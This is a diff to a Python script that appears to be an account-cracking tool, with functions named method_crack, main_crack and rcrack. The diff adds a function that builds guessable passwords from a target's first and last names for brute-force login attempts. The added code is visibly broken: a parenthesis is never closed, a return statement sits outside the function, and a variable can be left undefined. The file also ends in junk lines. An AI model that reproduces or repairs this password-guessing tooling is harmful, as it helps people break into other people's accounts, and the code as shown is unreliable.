@@ -374,7 +374,23 @@ def method_crack():
       print('\n Select Wrong Option ...')
       time.sleep(2)
       method_crack()
+def auto_passwords(name):
+    try:
+        first = name.split(' ')[0].lower()
+        last  = name.split(' ')[1].lower()
+    except:
+        last = "123"
 
+    pw = []
+    pw.append(first)
+    pw.append(first + "123")
+    pw.append(first + "12345")
+    pw.append(first + last)
+    pw.append(first + last + "123")
+    pw.append(first + "786")
+    pw.append("123456"
+
+return pw   # صحيح
 class main_crack():
     def __init__(self):
         self.id=[]
@@ -920,10 +936,9 @@ def rcrack(uid,pwx,tl):
         sys.stdout.flush()
     except:
         pass 
-		
 ############            
 
-#######
+##########
 def approval():
   clear()
   try:
@@ -961,4 +976,3 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
-
